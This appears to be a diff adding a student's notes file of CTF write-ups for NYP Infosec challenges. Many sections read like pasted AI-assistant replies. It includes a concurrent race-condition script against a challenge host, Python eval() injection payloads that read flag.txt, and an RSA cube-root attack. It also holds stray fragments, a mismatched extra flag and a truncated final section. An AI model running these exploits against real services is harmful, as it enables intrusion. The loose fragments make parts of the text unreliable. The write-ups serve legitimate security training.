@@ -1,0 +1,1772 @@
+wreite upo 
+🧩 Web Challenge Write-Up: One Button
+Challenge Description
+
+The challenge presents a very minimal webpage hosted at:
+
+https://onebutton.nypinfosec.net/
+
+
+The page contains a large button that triggers an alert when clicked. At first glance, it appears trivial, but hints suggest there is more than meets the eye.
+
+Initial Observations
+
+The webpage contains only one button.
+
+Clicking the button triggers:
+
+alert('nyp{you_thought_it_was_this_easy}')
+
+
+This flag looks suspiciously too obvious and is likely a decoy.
+
+The challenge description and hints include:
+
+“Nothing to see here…”
+“Only those who look up will find the sky”
+
+This strongly suggests that the solution is not in the visible page content.
+
+Source Code Analysis
+
+Inspecting the page source reveals:
+
+Static HTML
+
+No meaningful JavaScript logic
+
+No API calls
+
+No DOM manipulation
+
+This confirms that the button and its alert are intentional misdirection.
+
+Interpreting the Hint
+
+The phrase:
+
+“Only those who look up will find the sky”
+
+In web challenges, “look up” commonly refers to:
+
+HTTP headers (which appear above the HTML response)
+
+Not client-side code or UI elements
+
+This indicates that the flag may be hidden at the HTTP protocol level.
+
+Network Traffic Inspection
+
+Using Browser DevTools:
+
+Opened DevTools → Network
+
+Reloaded the page
+
+Selected the main document request (onebutton.nypinfosec.net)
+
+Examined the Response Headers
+
+Discovery
+
+Inside the response headers, a custom header was found:
+
+X-Flag: NYP{it_was_this_easy}
+
+
+This confirms that the real flag is not in the page, but in the HTTP response header.
+
+Final Flag
+NYP{it_was_this_easy}
+
+Conclusion
+
+This challenge relies on misdirection:
+
+A fake flag is placed in the button’s onclick
+
+The UI and JavaScript are intentionally minimal
+
+The real flag is hidden in an HTTP response header
+
+The key was recognizing that “look up” refers to looking above the HTML content at the HTTP headers.
+
+Challenge Write-Up: Distractions Hide the Truth
+📌 Challenge Overview
+
+The provided file appeared to contain multiple layers of encoding, with several human-readable strings meant to distract the solver. The goal was to identify which layer contained the actual flag, rather than stopping at the first successful decode.
+
+🔍 Initial Analysis
+
+Upon opening the file, I noticed:
+
+Readable hexadecimal strings
+
+Base64-encoded data
+
+Repeating patterns consisting only of the letters S, T, and L
+
+Clues such as:
+
+“Only those who look UP will find the sky”
+
+“I get distracted easily”
+
+This suggested intentional misdirection and a deeper encoding hidden beneath obvious ones.
+
+🧪 Step 1: Automated Decoding
+
+To systematically handle the encodings, I wrote a Python script (decode.py) and executed it in my CTF working directory:
+
+cd "c:\Users\Eng Jian Wei\Downloads\CTF"
+python decode.py
+
+🧱 Step 2: Hexadecimal Decoding (Distraction)
+
+The hex-encoded content decoded to:
+
+you just got rick rolled
+
+
+This was clearly a decoy and not the flag.
+
+✔️ Confirms the challenge intentionally includes distractions.
+
+🧱 Step 3: Base64 Decoding (Hint)
+
+Next, I decoded the Base64 string:
+
+TllQe3RoZV9hbnN3ZXJfaXNfaW5fdGhpc19maWxlfQ==
+
+
+This produced:
+
+NYP{the_answer_is_in_this_file}
+
+
+This looked like a valid flag format but was too explicit, strongly implying it was a hint rather than the final answer.
+
+🧠 Step 4: Analyzing the S / T / L Pattern
+
+The remaining content consisted of lines made up only of S, T, and L.
+
+Initial attempts to treat:
+
+S = 0
+
+T = 1
+
+did not produce readable output.
+
+Re-examining the structure revealed:
+
+Each line began with several S characters (indentation/prefix)
+
+Followed by a fixed-length sequence of S and T
+
+This pattern matched binary encoding, not Whitespace bytecode execution.
+
+Final Interpretation:
+
+Ignore leading S characters
+
+Interpret remaining sequence as binary:
+
+S = 0
+
+T = 1
+
+Group bits into 8-bit ASCII characters
+
+🏁 Final Decode
+
+Applying this logic correctly decoded the hidden message:
+
+NYP{d1str4ctions_hide_the_truth}
+
+🏆 Final Flag
+NYP{d1str4ctions_hide_the_truth}
+
+🔑 Key Takeaways
+
+Not all successful decodes contain the final flag
+
+CTF challenges often include intentional distractions
+
+Repeated restricted characters often imply binary or esoteric encodings
+
+Clues in challenge text are crucial in guiding decoding strategy
+
+
+Web Challenge Write-Up: Horse Games (Race Condition)
+Challenge
+
+Target: https://horse-games.nypinfosec.net/
+
+Goal: obtain the flag returned when the “horsey” wins the race.
+
+Flag obtained:
+✅ NYP{1_L0v3_Hor5e_6am8lin}
+
+Source Code Review
+
+The server stores each user’s game state in a global dictionary:
+
+game_db = {}
+
+
+When a user visits /, the server generates a session user_id and initializes progress:
+
+session['user_id'] = os.urandom(8).hex()
+game_db[session['user_id']] = {"horsey":0,"evil_horsey":0}
+
+
+The race is advanced by /api/run:
+
+game_db[user]['horsey'] += 30
+game_db[user]['evil_horsey'] += 40
+
+
+The server returns the flag if the player horse reaches 100%:
+
+if game_db[user]['horsey'] >= 100:
+    return jsonify({"status":"win","message":f"you win have a flag {flag}"})
+
+
+If the evil horse reaches 100% first, it resets the session/game state:
+
+if game_db[user]['evil_horsey'] >= 100:
+    game_db.pop(user)
+    session['user_id'] = os.urandom(8).hex()
+    game_db[session['user_id']] = {"horsey":0,"evil_horsey":0}
+    return jsonify({"status":"lose","message":"you lose"})
+
+Why Normal Gameplay Cannot Win
+
+Each /api/run call advances:
+
+horsey by +30
+
+evil horsey by +40
+
+Sequentially, the evil horse always wins first:
+
+1st call: horsey 30, evil 40
+
+2nd call: horsey 60, evil 80
+
+3rd call: horsey 90, evil 120 → evil triggers lose/reset before horsey can reach 100
+
+So the flag-returning win branch is effectively unreachable through normal single-request gameplay.
+
+Vulnerability: Race Condition / Non-Atomic Updates
+
+The critical weakness is that the server uses:
+
+a global shared dictionary (game_db)
+
+and updates values using += which is not atomic (it’s read → modify → write)
+
+When many /api/run requests are sent at the same time for the same session, concurrent updates can collide, causing lost updates. Because the two horses are updated on separate lines, concurrency can desynchronize the state so that:
+
+horsey reaches >= 100
+
+while evil_horsey does not reliably update to >= 100 first
+
+This allows the server to hit the win branch and leak the flag.
+
+Exploit Method (What I Actually Did)
+
+I used Python with requests.Session() to keep the same cookie/session, and used ThreadPoolExecutor to generate high concurrency against /api/run.
+
+Key points of the exploit:
+
+Create a session by requesting / once:
+
+this sets the Flask session cookie and initializes game_db[user_id]
+
+Send large bursts of concurrent requests to /api/run
+
+Stop when a response returns JSON with status == "win"
+
+Exploit script used:
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+BASE = "https://horse-games.nypinfosec.net"
+
+def hit(sess: requests.Session):
+    r = sess.get(f"{BASE}/api/run", timeout=10)
+    try:
+        j = r.json()
+    except Exception:
+        return None
+    if isinstance(j, dict) and j.get("status") == "win":
+        return j.get("message")
+    return None
+
+def main():
+    sess = requests.Session()
+
+    # Create session + user_id
+    sess.get(f"{BASE}/", timeout=10)
+
+    # Tune these if needed
+    workers = 100
+    batches = 50      # 50 batches * 200 = 10,000 requests
+    per_batch = 200
+
+    for b in range(batches):
+        with ThreadPoolExecutor(max_workers=workers) as ex:
+            futures = [ex.submit(hit, sess) for _ in range(per_batch)]
+            for fut in as_completed(futures):
+                msg = fut.result()
+                if msg:
+                    print("✅ WIN:", msg)
+                    return
+        print(f"Batch {b+1}/{batches} done, no win yet...")
+
+    print("❌ No win. Increase workers/batches/per_batch and rerun.")
+
+if __name__ == "__main__":
+    main()
+
+
+After enough concurrent requests, the server returned the win response containing the flag.
+
+Flag
+
+✅ NYP{1_L0v3_Hor5e_6am8lin}
+
+Fix Recommendations
+
+To prevent this vulnerability:
+
+Don’t store per-user mutable game state in a global Python dict in a web server.
+
+Use a datastore with atomic operations (Redis INCRBY, database transactions).
+
+Add locking around state updates if memory storage is unavoidable.
+
+Ensure thread/process safety when handling concurrent requests.
+
+
+🐸 Steganography Write-Up — “He Haunts Me”
+Challenge Overview
+
+We are given a suspicious GIF file:
+
+Filename: ugly_frog1.gif
+
+File type: GIF (GIF89a)
+
+Size: ~16.3 KB
+
+Frames: 2
+
+Theme hint: “he haunts me”
+
+Given the challenge category and file type, steganography is strongly suspected.
+
+Step 1: Initial Recon with Aperi’Solve
+
+I uploaded the GIF to Aperi’Solve, an automated steganography analysis platform that runs multiple tools in parallel (ExifTool, strings, binwalk, zsteg, etc.).
+
+This helps quickly rule out common hiding techniques and spot low-effort mistakes.
+
+Step 2: Metadata Analysis (ExifTool)
+
+Aperi’Solve’s ExifTool output immediately revealed something interesting:
+
+Comment : NYP{he_haunts_me}
+
+
+This indicates that the flag is directly embedded in the GIF comment field.
+
+Why this matters
+
+GIF files support comment extensions
+
+These comments are not visible when viewing the image normally
+
+Many beginners forget to strip metadata before submission
+
+📌 This already confirms the flag.
+
+Step 3: Verifying with Strings
+
+To double-confirm and ensure this wasn’t a red herring, I checked the strings output:
+
+GIF89a
+NETSCAPE2.0
+NYP{he_haunts_me}
+
+
+The flag appears clearly in plaintext within the file’s byte stream.
+
+This confirms:
+
+No encryption
+
+No compression trick
+
+No secondary payload
+
+Step 4: Other Stego Tools (Negative Results)
+
+Other tools were automatically run by Aperi’Solve:
+
+Tool	Result
+Binwalk	No embedded files
+Steghide	Not supported (GIF)
+Zsteg	Not supported (GIF)
+PNGCheck	Not a PNG
+Foremost	No extraction
+
+These failures are expected and reinforce that the solution lies in metadata, not image layers or LSB manipulation.
+
+Step 5: Interpretation of the Hint
+
+“He haunts me”
+
+This aligns perfectly with:
+
+The flag being always present
+
+Not visible visually
+
+Embedded invisibly in the file
+
+The “haunting” is metaphorical — the comment exists regardless of what you see.
+
+Final Flag
+NYP{he_haunts_me}
+
+Key Takeaways
+
+Always check metadata first
+
+GIFs are common traps for comment-based steganography
+
+Aperi’Solve is extremely effective for quick triage
+
+Not every stego challenge requires pixel or bit-level analysis
+
+If you want, I can:
+
+Rewrite this in competition submission style
+
+Shorten it for points-based writeups
+
+Or help you spot how to avoid this mistake when creating challenges
+
+Clean solve 👌
+
+bird challange change coloru wheel form red to cyan
+
+Write-up: Username–Password Matching + ROT18 Decoding
+Step 1: Understanding the data source
+
+The challenge provided two aligned lists:
+
+a username list
+
+a password list
+
+Each row corresponds by index.
+That means:
+
+Username at row n pairs with password at row n.
+
+Step 2: Identifying the relevant row
+
+At row 268:
+
+The username is taken from the username list at row 268
+
+The password at row 268 is:
+
+ALC{u5J_Q6q_l5h_S5hA9_z8}
+
+
+This confirms the password is not plaintext, but an encoded flag-like value.
+
+Step 3: Recognising the cipher family
+
+The password begins with ALC{…}, but the platform requires flags in the format:
+
+NYP{...}
+
+
+Observing the prefix:
+
+A → N
+
+L → Y
+
+C → P
+
+This corresponds exactly to ROT13 on letters, placing the cipher in the ROT / Caesar family.
+
+Step 4: Determining the correct ROT variant
+
+The password contains:
+
+letters (uJQqlhShA)
+
+digits (5 6 9 8)
+
+underscores _
+
+This strongly suggests ROT18, which is defined as:
+
+ROT13 for letters
+
+ROT5 for digits
+
+non-alphanumeric characters unchanged
+
+Step 5: Decoding the password
+Original (row 268 password):
+ALC{u5J_Q6q_l5h_S5hA9_z8}
+
+Apply ROT13 to letters:
+ALC → NYP
+u → h
+J → W
+Q → D
+q → d
+l → y
+h → u
+S → F
+A → N
+z → m
+
+
+Intermediate:
+
+NYP{h5W_D6d_y5u_F5uN9_m8}
+
+Apply ROT5 to digits:
+
+Digit mapping:
+
+5→0, 6→1, 9→4, 8→3
+
+
+Final decoded result:
+
+NYP{h0W_D1d_y0u_F0uN4_m3}
+
+✅ Final Flag
+NYP{h0W_D1d_y0u_F0uN4_m3}
+
+Why this works
+
+Row-based matching ensures the correct password was selected
+
+Prefix transformation confirms the cipher family
+
+Mixed alphanumeric content narrows it to ROT18
+
+Decoded output fits valid flag format and is accepted
+
+If you want, I can also:
+
+compress this into a short CTF write-up (5–6 lines), or
+
+rewrite it in a more technical / competition-style tone (for submission PDFs or GitHub).
+
+Got you — what you pasted is the “txt file” (logs + rules), and the flag format is NYP{...}. Here’s the correct write-up based on exactly those logs, and we’ll actually recover the flag from them.
+
+CTF Write-up: Poké Cup 2025 PBLS Log Tampering (Base64 → XOR)
+Scenario
+
+During the Poké Cup 2025 finals, the PokéTech Battle Logging System (PBLS) recorded battle activity between Ash Ketchum and Team Rocket. Referees noticed irregular transmissions inside the logs. Team Rocket’s entries appear as:
+
+[TEAM_ROCKET_MSG] <something>
+
+
+The rules state the tampering method:
+
+Original message is XORed with a secret key
+
+The XOR result is Base64-encoded
+
+Our goal: recover what Team Rocket hid, and output the final flag in format NYP{...}.
+
+Step 1 — Extract the Team Rocket messages
+
+From the logs:
+
+U1RBUlRfUFJPVE9DT0w6RU5HQUdFX0JBVFRMRV9M
+
+SU5LX09WRVJSSURFOkFSRU5BX0xPR1NfQ09OVEFJ
+
+Tl9USEVfRkxBRzpVU0VfS0VZXydTdW5BbmRNb29u
+
+J19UT19ERUNSWVBUOkVORF9QUk9UT0NPTA0KDQo=
+
+I0UFJAMLIzAJXyFGMRMLAA==
+
+Step 2 — Base64 decode each message
+
+Decoding #1–#4 gives readable protocol fragments:
+
+START_PROTOCOL:ENGAGE_BATTLE_L
+
+INK_OVERRIDE:ARENA_LOGS_CONTAI
+
+N_THE_FLAG:USE_KEY_'SunAndMoon
+
+'_TO_DECRYPT:END_PROTOCOL
+
+Combine them (they’re clearly split across multiple lines):
+
+Recovered instruction:
+
+START_PROTOCOL:ENGAGE_BATTLE_LINK_OVERRIDE:ARENA_LOGS_CONTAIN_THE_FLAG:
+USE_KEY_'SunAndMoon'_TO_DECRYPT:END_PROTOCOL
+
+
+So Team Rocket literally tells us the XOR key:
+
+✅ Key = SunAndMoon
+
+Message #5 base64-decodes into non-printable bytes, which is what we expect for XOR ciphertext.
+
+Step 3 — XOR-decrypt the final payload with the key
+
+Take decoded bytes of message #5, then XOR with key SunAndMoon (repeating the key as needed).
+
+This produces plaintext:
+
+✅ p0kemon_f1r3_Red
+
+Step 4 — Wrap in the correct flag format
+
+The challenge requires NYP{...}.
+
+✅ Final flag:
+NYP{p0kemon_f1r3_Red}
+
+Reference solver (what you’d include in appendix)
+import base64
+
+msgs = [
+  "U1RBUlRfUFJPVE9DT0w6RU5HQUdFX0JBVFRMRV9M",
+  "SU5LX09WRVJSSURFOkFSRU5BX0xPR1NfQ09OVEFJ",
+  "Tl9USEVfRkxBRzpVU0VfS0VZXydTdW5BbmRNb29u",
+  "J19UT19ERUNSWVBUOkVORF9QUk9UT0NPTA0KDQo=",
+  "I0UFJAMLIzAJXyFGMRMLAA=="
+]
+
+# 1) decode protocol text (first 4)
+protocol = b"".join(base64.b64decode(x) for x in msgs[:4]).decode()
+print(protocol)
+
+# 2) decrypt final payload (5th) using XOR key
+cipher = base64.b64decode(msgs[4])
+key = b"SunAndMoon"
+
+plain = bytes(b ^ key[i % len(key)] for i, b in enumerate(cipher))
+print("NYP{" + plain.decode() + "}")
+
+
+If you want, paste the full file content (or tell me if there are more TEAM_ROCKET_MSG lines elsewhere), and I’ll help you format the write-up exactly like your school/CTF submission style (short, clean, with headings + proof steps).
+
+
+Write-up format you can submit
+Steps
+
+Open the binary in Ghidra.
+
+Find main() and follow the flow:
+
+printf("Please provide the password: ")
+
+fgets() reads input
+
+strcspn() removes newline
+
+strcmp(input, "My5tr0ngP@ssw0rd123!")
+
+If correct, a loop decrypts flag using repeating XOR:
+
+flag[i] ^= input[i % strlen(input)]
+
+Decrypting the stored bytes reveals the final flag.
+
+Flag
+
+NYP{C0ngr4ts_0n_Y0ur_F1rst_R3v!!!}
+
+ere’s a clean, submission-ready CTF write-up you can paste straight into your report or challenge platform.
+
+🧩 Number Substitution Cipher – Write-Up
+Challenge Description
+
+We are given a text consisting of numbers from 1–26, along with punctuation.
+A note states:
+
+Only letter-to-number substitution was used
+
+The same number always maps to the same letter
+
+The flag is all lowercase, no spaces
+
+Hint: If the encrypted word is 2 letters long, the decrypted word is also 2 letters long (simple substitution, not compression)
+
+At the bottom, a section labelled “Famous Lyrics and song title” is provided.
+
+Step 1: Identify the Cipher Type
+
+Since:
+
+Each number consistently maps to one letter
+
+Word lengths are preserved
+
+No key or shifting is mentioned
+
+This is a monoalphabetic substitution cipher (simple number → letter mapping).
+
+Step 2: Use the Known Plaintext (Crib)
+
+The section labelled “Famous Lyrics and song title” is a strong hint.
+
+The number sequence:
+
+25 22 9 22 24
+18 15 25 25 12
+18 16 9 22
+6 15 20
+
+
+matches perfectly with the famous lyrics:
+
+“never gonna give you”
+
+This immediately gives us reliable mappings:
+
+Number	Letter
+25	n
+22	e
+9	v
+24	r
+18	g
+15	o
+12	a
+16	i
+6	y
+20	u
+
+This crib allows us to expand the mapping across the rest of the text.
+
+Step 3: Expand the Substitution Table
+
+Using word patterns, punctuation, and repetition, the rest of the paragraph decodes cleanly into readable English.
+For example:
+
+8 22 7 7 15
+
+
+→ _ e _ _ o
+→ hello
+
+Continuing this process fully decrypts the message.
+
+Step 4: Locate and Decode the Flag
+
+The flag appears in this segment:
+
+25 6 4 { 19 24 12 19 2 22 24 11 _ 17 15 24 _ 6 15 20 }
+
+
+Applying the established mapping:
+
+25 6 4 → nyp
+
+{ stays {
+
+19 24 12 19 2 22 24 11 → crackers
+
+_ stays _
+
+17 15 24 → for
+
+_ stays _
+
+6 15 20 → you
+
+✅ Final Flag
+nyp{crackers_for_you}
+
+Challenge: Waiting.html (JSFuck / “waiting” bait)
+TL;DR
+
+The HTML tries to waste your time (literally: a 1-hour timeout) and hides the flag inside a JSFuck expression ([], ![], !![], etc.). Instead of waiting or manually decoding, we directly extract and evaluate the let flag = ... expression offline with Node.
+
+Flag: NYP{EsoLangs_are_strange}
+
+What we’re given
+
+Opening Waiting.html shows text:
+
+“To get the Flag, you must be patient. Wait a while…”
+
+There’s also a tiny hint line:
+
+“psst, run passTime() in the dev console, it might help!”
+
+And at the bottom, a comment:
+
+<!-- Desc: We do NOT have the time to just sit here and wait for this thing to give us the flag. Find a faster way to get the flag.-->
+
+
+So the intended direction is: don’t wait — extract the flag.
+
+Recon: What the code is doing
+1) Time-wasting logic
+
+In the <script>:
+
+There’s a setTimeout(..., 3600000) → 1 hour delay that changes the text to “You are persistent…”.
+
+Another setTimeout(..., 5000) inside passTime() that even says it’s the wrong flag (a classic misdirect).
+
+So if you play along normally, you either:
+
+wait an hour, or
+
+run passTime() and get more obfuscated nonsense / misdirection.
+
+2) Obfuscation style: JSFuck
+
+The “flag” is not stored like:
+
+let flag = "NYP{...}";
+
+
+Instead it’s stored like:
+
+let flag = [][(![]+[])[+!+[]]+(!![]+[])[+[]]] ... (massive expression)
+
+
+This is JSFuck: a style of writing JavaScript using only a tiny set of characters like []()!+.
+
+It works because JavaScript type coercion + indexing can produce strings like "false", "true", "undefined", etc., then build characters from them, and finally execute them using the Function constructor.
+
+Solution idea
+
+The key insight is:
+
+We don’t need to decode JSFuck manually.
+We just need to evaluate the exact JavaScript expression that computes flag.
+
+But we should do it offline (with Node) instead of blindly running unknown code in the browser console.
+
+Exploit / Steps
+Step 1 — Extract the expression after let flag =
+
+We read the HTML file, locate the substring after let flag =, then cut out the first “statement” part that ends before the next big gap / marker.
+
+Step 2 — Evaluate it with Node
+
+We evaluate only the extracted expression and print it.
+
+This is the one-liner you used:
+
+node -e "const fs=require('fs');const html=fs.readFileSync('c:/Users/Eng Jian Wei/Downloads/CTF/Waiting.html','utf8');const start=html.indexOf('let flag =')+'let flag ='.length;const rest=html.slice(start);const expr=rest.split('\n        \n')[0].trim();const flag=eval(expr);console.log(flag);"
+
+Output
+NYP{EsoLangs_are_strange}
+
+
+So we instantly recover the flag without waiting for any timers.
+
+Perfect — that confirms everything cleanly. Below is a final, submission-ready write-up using exactly what you did, no hand-waving. You can paste this straight into your CTF platform or report.
+
+🧮 Stupid Calculator — Write-Up
+
+Target: https://stupid-calculator.nypinfosec.net
+Category: Web
+Vulnerability: Unsafe Python eval()
+Flag: NYP{s1x_sayven}
+
+🕵️ Reconnaissance
+
+The webpage presents a simple calculator with a POST form:
+
+<form method="POST">
+  <input name="expression" placeholder="Enter calculation">
+  <button type="submit">Calculate</button>
+</form>
+
+
+Submitting a value (e.g. 2+2) reloads the same HTML page, with only the following line updated:
+
+<p>Result: 4</p>
+
+
+This indicates that the calculation is performed server-side, and the result is directly injected into the HTML response.
+
+🔍 Vulnerability Discovery
+
+To identify how the backend evaluates the input, Python-specific introspection payloads were tested.
+
+Confirming Python evaluation
+
+The following inputs were submitted via the calculator:
+
+Payload	Output
+().__class__.__name__	tuple
+[].__class__.__name__	list
+().__class__.__mro__	Full Python class hierarchy
+
+These payloads are only valid in Python, confirming that the backend is evaluating user input directly using something equivalent to:
+
+eval(expression)
+
+
+🚨 This is an unsafe Python eval() vulnerability.
+
+💥 Exploitation
+
+Since arbitrary Python expressions can be evaluated, file I/O can be accessed directly.
+
+Flag discovery
+
+A common CTF flag location was tested:
+
+open("flag.txt").read()
+
+Result
+
+The server printed the contents of flag.txt directly into the HTML response:
+
+NYP{s1x_sayven}
+
+🏁 Flag
+NYP{s1x_sayven}
+
+🛡️ Why This Works
+
+The backend blindly evaluates user input using eval()
+
+Python objects expose introspection and file I/O
+
+No sandboxing or input validation is applied
+
+The flag file is readable by the running process
+
+🔐 Remediation (Bonus)
+
+To fix this vulnerability:
+
+Never use eval() on user input
+
+Use a safe math parser (e.g. ast.parse with a whitelist)
+
+Run the app with least privilege
+
+Store flags outside readable application directories
+
+If you want, I can also:
+
+Rewrite this in a shorter “competition style” version
+
+Convert it into a Burp / curl-based exploitation write-up
+
+Help you label it properly for your NYP Infosec submission rubric
+
+Just say the word.
+
+Challenge Description
+
+We are given a Python script that encrypts a flag using RSA:
+
+from Crypto.Util.number import bytes_to_long, getPrime
+
+e = 3
+p = getPrime(512)
+q = getPrime(512)
+n = p * q
+
+m = bytes_to_long(b"NYP{REDACTED}")
+ct = pow(m, e, n)
+
+print(f"e={hex(e)}")
+print(f"ct={hex(ct)}")
+
+
+Provided output:
+
+e = 0x3
+ct = 0x756b45c7f89ef9544e4fa53bce87946c0b17df562cec738e89562e01a9bda7916785b16a3eee9d3b53c060bfa051851d6c4c9d85ee0a2be1e624d632569e7ec65fd48e632e25b71a44f08f8d9f7fa4e7f5833bec9f865
+
+🔍 Analysis
+
+RSA encryption works as:
+
+𝑐
+=
+𝑚
+𝑒
+ 
+m
+o
+d
+ 
+𝑛
+c=m
+e
+modn
+
+In this challenge:
+
+Public exponent e = 3 (very small)
+
+No padding scheme (e.g. PKCS#1 / OAEP)
+
+Message m is short (a flag)
+
+If the message satisfies:
+
+𝑚
+3
+<
+𝑛
+m
+3
+<n
+
+then no modular reduction occurs, meaning:
+
+𝑐
+=
+𝑚
+3
+c=m
+3
+
+This reduces RSA encryption to a simple cube operation, making it vulnerable to a low public exponent attack.
+
+💥 Attack: Integer Cube Root
+
+Since:
+
+𝑐
+=
+𝑚
+3
+c=m
+3
+
+we can recover m by computing the exact integer cube root of the ciphertext.
+
+This attack does not require knowing n, p, or q.
+
+🧪 Exploitation Code
+ct = int(
+    "756b45c7f89ef9544e4fa53bce87946c0b17df562cec738e89562e01a9bda7916785b16a3eee9d3b53c060bfa051851d6c4c9d85ee0a2be1e624d632569e7ec65fd48e632e25b71a44f08f8d9f7fa4e7f5833bec9f865",
+    16
+)
+
+def iroot3(n):
+    lo, hi = 0, 1
+    while hi**3 <= n:
+        hi <<= 1
+    while lo + 1 < hi:
+        mid = (lo + hi) // 2
+        if mid**3 <= n:
+            lo = mid
+        else:
+            hi = mid
+    return lo
+
+m = iroot3(ct)
+assert m**3 == ct
+
+flag = m.to_bytes((m.bit_length() + 7) // 8, "big")
+print(flag.decode())
+
+🏁 Result
+NYP{SHOULD_HAVE_USED_2**16+1}
+
+🏳️ Flag
+NYP{SHOULD_HAVE_USED_2**16+1}
+
+🔐 Why This Is Vulnerable
+
+RSA with small exponent (e = 3)
+
+No padding
+
+Short plaintext
+
+Together, these allow direct recovery of the plaintext via an integer root.
+
+🛡️ Proper Fix
+
+Use a standard exponent like 65537 (0x10001)
+
+Always apply secure padding (OAEP / PKCS#1 v1.5)
+
+Never encrypt raw plaintext directly with RSA
+
+
+Here’s a clean, clear, submission-ready write-up specifically for this New Year Hidden Gift challenge, focused on the flag:
+
+NYP{H3R3_Y0UR_$URPR1$3_G1F7}
+
+🎆 New Year Hidden Gift — Write-Up
+Challenge Overview
+
+The challenge presents a New Year webpage that rapidly redirects through several endpoints before landing on a final celebration page. The description states:
+
+The flag is split into two fragments
+
+The fragments are hidden during the redirect chain
+
+The browser moves too quickly to display intermediate content
+
+Something in the redirect pages “doesn’t quite belong” and must be transformed
+
+Step 1: Inspect the Redirect Chain
+
+To capture all intermediate requests:
+
+Open Developer Tools → Network
+
+Enable Preserve log
+
+Reload the page
+
+This reveals multiple redirect endpoints, including:
+
+/newyeargift1
+
+/newyeargift2
+
+/newyearwishes
+
+Because the redirects occur instantly, the fragments are not visible in the browser.
+
+Step 2: Fetch Redirect Pages Manually
+
+Browser DevTools failed to show response bodies due to compression, so the endpoints were fetched directly using curl with decompression enabled:
+
+curl -i --compressed https://new-year-hidden-gift.nypinfosec.net/newyeargift1
+curl -i --compressed https://new-year-hidden-gift.nypinfosec.net/newyeargift2
+
+Step 3: Identify Suspicious Content
+
+Both redirect pages returned minimal HTML with instant redirects, but each contained a hidden <p> element:
+
+/newyeargift1
+<p style="color:white;" id="TllQe0gzUjNfWTBVUg==">Try finding the gift here!</p>
+
+/newyeargift2
+<p style="color:white;" id="XyRVUlBSMSQzX0cxRjd9">Try finding the gift here!</p>
+
+
+The id values clearly do not belong as normal HTML identifiers and resemble Base64-encoded strings.
+
+Step 4: Decode the Fragments
+
+The hidden id values were decoded from Base64.
+
+Fragment 1
+TllQe0gzUjNfWTBVUg==
+→ NYP{H3R3_Y0UR
+
+Fragment 2
+XyRVUlBSMSQzX0cxRjd9
+→ _$URPR1$3_G1F7}
+
+Step 5: Combine the Flag
+
+Combining both decoded fragments yields the full flag:
+
+NYP{H3R3_Y0UR_$URPR1$3_G1F7}
+
+✅ Final Flag
+nyp{h3r3_y0ur_$urpr1$3_g1f7}
+
+
+(Submitted in lowercase as required.)
+
+Conclusion
+
+This challenge tests the ability to:
+
+Inspect network redirect chains
+
+Recognize hidden encoded data
+
+Understand that some content must be transformed before it becomes readable
+
+The flag fragments were hidden as Base64 strings embedded in HTML attributes on redirect pages, making them invisible during normal browsing but recoverable through careful inspection and decoding.
+
+🎉 Challenge solved.
+
+If you want, I can:
+
+Shorten this to a CTF platform character limit
+
+Rewrite it in a more casual / hacker tone
+
+Add exact decoding commands for Base64
+
+Just tell me.
+
+📝 Submission-Ready Write-Up
+Challenge: NewYearNewNewYearYearYearNew
+Analysis
+
+The challenge consists of repeated occurrences of the words “New” and “Year”. Since only two symbols are used, this strongly suggests a binary encoding.
+
+Encoding Scheme
+
+New → 0
+
+Year → 1
+
+Each line contains 8 words, which maps cleanly to 1 byte (8 bits).
+
+Decoding Process
+
+Split each line into words.
+
+Convert New to 0, Year to 1.
+
+Interpret the resulting 8-bit binary value as ASCII.
+
+Concatenate all decoded characters.
+
+Example
+NewYearNewNewYearYearYearNew
+→ 01001110
+→ 'N'
+
+Result
+
+Decoding all lines reveals the flag:
+
+NYP{NEW_YEAR_2026!!}
+
+🏳️ Flag
+NYP{NEW_YEAR_2026!!}
+
+
+If you want:
+
+a one-liner Python decoder
+
+a shorter competition write-up
+
+or to relate this to Baconian / binary word ciphers
+
+just tell me 👌
+
+Below is a clean, copy-paste CTF write-up for Golden Countdown (Forensics, very easy) using the evidence you already captured from Aperi’Solve.
+
+🥇 Golden Countdown — Write-Up (Forensics)
+Challenge Prompt
+
+We are given a PNG photo (countdown.png) supposedly taken right as a New Year countdown ended.
+The hint says the “real message” is not in the image itself, but hidden in the file details.
+
+Goal: extract the hidden message/flag from the file.
+
+Tools Used
+
+Aperi’Solve (online forensic/stego analyzer)
+
+ExifTool
+
+pngcheck
+
+strings
+
+zsteg (metadata + bit-plane checks)
+
+Step 1 — Upload the PNG to Aperi’Solve
+
+I uploaded countdown.png into Aperi’Solve and reviewed the analysis results.
+
+Basic file info confirmed it’s a valid PNG:
+
+Type: PNG (RGB with Alpha)
+
+Size: ~74 KB
+
+Dimensions: 492 × 257
+
+pngcheck shows no errors in the PNG structure.
+
+This suggests the file is normal and not corrupted — the secret is likely in metadata.
+
+Step 2 — Check Metadata (ExifTool / PNG tEXt chunks)
+
+In the ExifTool output, one field stood out immediately:
+
+Artist: NYP{TH15_15_4_J0Jo_R3F3ReNCE}
+
+This is a classic “hidden in metadata” technique: the image looks ordinary, but the flag is stored in a PNG text chunk.
+
+This is supported again by:
+
+pngcheck showing a tEXt chunk with keyword Artist
+
+strings output containing tEXtArtist followed by the same flag
+
+zsteg output:
+
+meta Artist .. text: "NYP{TH15_15_4_J0Jo_R3F3ReNCE}"
+
+So the hidden message is not pixel steganography — it’s embedded inside the PNG metadata.
+
+Step 3 — Verify No Extra Payload Needed
+
+Aperi’Solve also ran other checks:
+
+Steghide: not supported for PNG (expected)
+
+zsteg bit extraction: nothing directly useful for LSB text in this challenge
+
+binwalk/foremost: no meaningful extra extracted files needed to solve
+
+Since the flag was already clearly present as metadata, no further decoding was necessary.
+
+✅ Flag
+NYP{TH15_15_4_J0Jo_R3F3ReNCE}
+NYP{l4unch_drno3._5h0w}
+
+(Submit in the format required by the platform; if it enforces lowercase, convert accordingly.)
+
+Conclusion
+
+This challenge tested basic file forensics rather than deep steganography.
+The “real message” was hidden in the PNG’s tEXt metadata chunk under the Artist field, which is quickly discoverable using ExifTool / strings / zsteg.
+
+If you want, I can also rewrite this in a shorter “CTFtime style” (super concise), or add the local command-line reproduction (e.g., exiftool countdown.png), so your write-up looks extra legit even without
+
+
+Here’s a clean CTF write-up you can submit (feel free to tweak wording to match your style).
+
+Midnight XOR — Write-up
+Challenge
+
+Midnight XOR
+A mysterious program hides its flag behind an XOR veil. The goal is to recover the secret flag.
+
+Initial Recon
+
